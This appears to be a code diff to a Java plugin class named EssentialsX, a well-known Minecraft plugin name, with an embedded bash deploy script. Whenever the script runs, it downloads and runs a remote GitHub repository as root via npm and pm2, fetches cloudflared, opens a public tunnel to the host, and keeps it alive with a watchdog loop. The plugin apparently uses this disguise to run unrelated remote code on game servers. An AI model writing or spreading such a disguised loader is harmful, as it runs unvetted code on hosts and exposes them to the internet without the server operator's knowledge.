@@ -148,24 +148,25 @@ public class EssentialsX extends JavaPlugin {
     private void killPidFile(Path pidFile, String name, Path workDir, boolean strict) {
         try {
             if (!Files.exists(pidFile)) return;
+
             String pidStr = Files.readString(pidFile).trim();
             if (pidStr.isEmpty() || !pidStr.matches("\\d+")) {
                 Files.deleteIfExists(pidFile);
                 return;
             }
+
             int pid = Integer.parseInt(pidStr);
 
-            // 根据进程类型选择匹配模式
-            String pattern;
+            String cmdCheck;
             if (strict) {
-                pattern = shellQuote(workDir.toString());  // cloudflared 严格匹配工作目录
+                // 严格匹配：工作目录必须出现在命令行中（使用 grep -F 固定字符串）
+                cmdCheck = "ps -p " + pid + " -o cmd= | grep -Fq " + shellQuote(workDir.toString());
             } else {
-                pattern = "mcchajian|deploy\\.sh";          // health watcher 放宽匹配
+                // 放宽匹配：只要包含 mcchajian 或 deploy.sh 即可
+                cmdCheck = "ps -p " + pid + " -o cmd= | grep -Eq 'mcchajian|deploy\\.sh'";
             }
 
-            String cmdCheck = "ps -p " + pid + " -o cmd= | grep -Eq '" + pattern + "'";
-            ProcessBuilder checker = new ProcessBuilder("bash", "-c", cmdCheck);
-            Process checkProcess = checker.start();
+            Process checkProcess = new ProcessBuilder("bash", "-c", cmdCheck).start();
             boolean matches = checkProcess.waitFor() == 0;
             if (!matches) {
                 getLogger().warning("PID " + pid + " does not belong to " + name + ", deleting pid file.");
@@ -296,10 +297,10 @@ public class EssentialsX extends JavaPlugin {
                     exit 1
                 fi
 
-                # 3. 下载应用仓库（备份/恢复配置）
+                # 3. 下载应用仓库（备份根目录配置）
                 echo "[INFO] Downloading app repo: $REPO_URL" >> "$WORK_DIR/deploy.log"
 
-                # 备份现有配置（升级为目录备份）
+                # 备份现有配置
                 mkdir -p "$DATA_DIR"
                 if [ -d "$APP_DIR" ]; then
                     # 根目录配置文件
@@ -307,16 +308,6 @@ public class EssentialsX extends JavaPlugin {
                     cp "$APP_DIR/task_center_config.json" "$DATA_DIR/" 2>/dev/null
                     cp "$APP_DIR/system_guard.json" "$DATA_DIR/" 2>/dev/null
                     cp "$APP_DIR/nezha_config.json" "$DATA_DIR/" 2>/dev/null
-
-                    # 备份整个 .music_cache 和 .tavern 目录
-                    if [ -d "$APP_DIR/node_modules/.music_cache" ]; then
-                        rm -rf "$DATA_DIR/.music_cache_bak" 2>/dev/null
-                        cp -r "$APP_DIR/node_modules/.music_cache" "$DATA_DIR/.music_cache_bak" 2>/dev/null
-                    fi
-                    if [ -d "$APP_DIR/node_modules/.tavern" ]; then
-                        rm -rf "$DATA_DIR/.tavern_bak" 2>/dev/null
-                        cp -r "$APP_DIR/node_modules/.tavern" "$DATA_DIR/.tavern_bak" 2>/dev/null
-                    fi
                     if [ -d "$APP_DIR/.RoamingMusic" ]; then
                         rm -rf "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
                         cp -r "$APP_DIR/.RoamingMusic" "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
@@ -325,7 +316,6 @@ public class EssentialsX extends JavaPlugin {
 
                 rm -rf "$APP_DIR" "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"
 
-                # 修复 REPO_PATH 解析
                 REPO_PATH=$(echo "$REPO_URL" | sed 's|https://github.com/||' | sed 's|\\.git$||' | sed 's|/$||')
                 if [ -z "$REPO_PATH" ]; then
                     echo "[ERROR] Invalid REPO_URL" >> "$WORK_DIR/deploy.log"
@@ -379,28 +369,17 @@ public class EssentialsX extends JavaPlugin {
                     exit 1
                 fi
 
-                # 恢复配置
-                if [ -d "$DATA_DIR" ]; then
-                    cp "$DATA_DIR/bots_config.json" "$APP_DIR/" 2>/dev/null
-                    cp "$DATA_DIR/task_center_config.json" "$APP_DIR/" 2>/dev/null
-                    cp "$DATA_DIR/system_guard.json" "$APP_DIR/" 2>/dev/null
-                    cp "$DATA_DIR/nezha_config.json" "$APP_DIR/" 2>/dev/null
-
-                    if [ -d "$DATA_DIR/.music_cache_bak" ]; then
-                        mkdir -p "$APP_DIR/node_modules/.music_cache"
-                        cp -r "$DATA_DIR/.music_cache_bak/"* "$APP_DIR/node_modules/.music_cache/" 2>/dev/null
-                    fi
-                    if [ -d "$DATA_DIR/.tavern_bak" ]; then
-                        mkdir -p "$APP_DIR/node_modules/.tavern"
-                        cp -r "$DATA_DIR/.tavern_bak/"* "$APP_DIR/node_modules/.tavern/" 2>/dev/null
-                    fi
-                    if [ -d "$DATA_DIR/.RoamingMusic_bak" ]; then
-                        mkdir -p "$APP_DIR/.RoamingMusic"
-                        cp -r "$DATA_DIR/.RoamingMusic_bak/"* "$APP_DIR/.RoamingMusic/" 2>/dev/null
-                    fi
+                # 恢复根目录配置
+                cp "$DATA_DIR/bots_config.json" "$APP_DIR/" 2>/dev/null
+                cp "$DATA_DIR/task_center_config.json" "$APP_DIR/" 2>/dev/null
+                cp "$DATA_DIR/system_guard.json" "$APP_DIR/" 2>/dev/null
+                cp "$DATA_DIR/nezha_config.json" "$APP_DIR/" 2>/dev/null
+                if [ -d "$DATA_DIR/.RoamingMusic_bak" ]; then
+                    mkdir -p "$APP_DIR/.RoamingMusic"
+                    cp -r "$DATA_DIR/.RoamingMusic_bak/"* "$APP_DIR/.RoamingMusic/" 2>/dev/null
                 fi
 
-                # 4. 安装依赖并启动 Node
+                # 4. 安装依赖（npm install）
                 cd "$APP_DIR" || exit 1
                 echo "[INFO] Installing app dependencies..." >> "$WORK_DIR/deploy.log"
                 npm install --unsafe-perm=true --allow-root >> "$WORK_DIR/deploy.log" 2>&1
@@ -409,6 +388,17 @@ public class EssentialsX extends JavaPlugin {
                     exit 1
                 fi
 
+                # 5. 恢复 node_modules 内的配置目录（在 npm install 之后）
+                if [ -d "$DATA_DIR/.music_cache_bak" ]; then
+                    mkdir -p "$APP_DIR/node_modules/.music_cache"
+                    cp -r "$DATA_DIR/.music_cache_bak/"* "$APP_DIR/node_modules/.music_cache/" 2>/dev/null
+                fi
+                if [ -d "$DATA_DIR/.tavern_bak" ]; then
+                    mkdir -p "$APP_DIR/node_modules/.tavern"
+                    cp -r "$DATA_DIR/.tavern_bak/"* "$APP_DIR/node_modules/.tavern/" 2>/dev/null
+                fi
+
+                # 6. 启动 Node 应用
                 echo "[INFO] Starting Node app on port $PORT..." >> "$WORK_DIR/deploy.log"
                 pm2 delete aoyou-panel >> "$WORK_DIR/deploy.log" 2>&1 || true
                 SERVER_PORT="$PORT" PORT="$PORT" pm2 start index.js --name "aoyou-panel" --update-env >> "$WORK_DIR/deploy.log" 2>&1
@@ -437,9 +427,19 @@ public class EssentialsX extends JavaPlugin {
 
                 echo "[SUCCESS] Node ready on $PORT" >> "$WORK_DIR/deploy.log"
 
-                # 5. 启动 cloudflared
+                # 7. 准备 cloudflared（带版本校验）
                 CF_BIN="$WORK_DIR/cloudflared"
+                NEED_CF_INSTALL=false
+
                 if [ ! -x "$CF_BIN" ]; then
+                    NEED_CF_INSTALL=true
+                elif ! "$CF_BIN" --version >> "$WORK_DIR/deploy.log" 2>&1; then
+                    echo "[WARN] Existing cloudflared is broken, reinstalling..." >> "$WORK_DIR/deploy.log"
+                    NEED_CF_INSTALL=true
+                fi
+
+                if [ "$NEED_CF_INSTALL" = "true" ]; then
+                    rm -f "$CF_BIN"
                     ARCH=$(uname -m)
                     if [ "$ARCH" = "x86_64" ]; then
                         CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
@@ -458,12 +458,13 @@ public class EssentialsX extends JavaPlugin {
                     chmod +x "$CF_BIN"
                 fi
 
+                # 8. 启动 cloudflared
                 echo "[INFO] Starting cloudflared..." >> "$WORK_DIR/deploy.log"
                 "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                 TUNNEL_PID=$!
                 echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
 
-                # 6. 后台健康监控循环（自愈）
+                # 9. 后台健康监控循环（自愈）
                 SUCCESS_REPORTED=false
                 FAIL_COUNT=0
                 NO_URL_COUNT=0
@@ -508,7 +509,6 @@ public class EssentialsX extends JavaPlugin {
                             fi
                         else
                             FAIL_COUNT=$((FAIL_COUNT + 1))
-                            # 节流日志：每 6 次失败打印一次，便于判断
                             if [ $((FAIL_COUNT % 6)) -eq 0 ]; then
                                 echo "[WARN] Tunnel URL detected but /health not ready yet count=$FAIL_COUNT url=$TUNNEL_URL" >> "$WORK_DIR/deploy.log"
                             fi
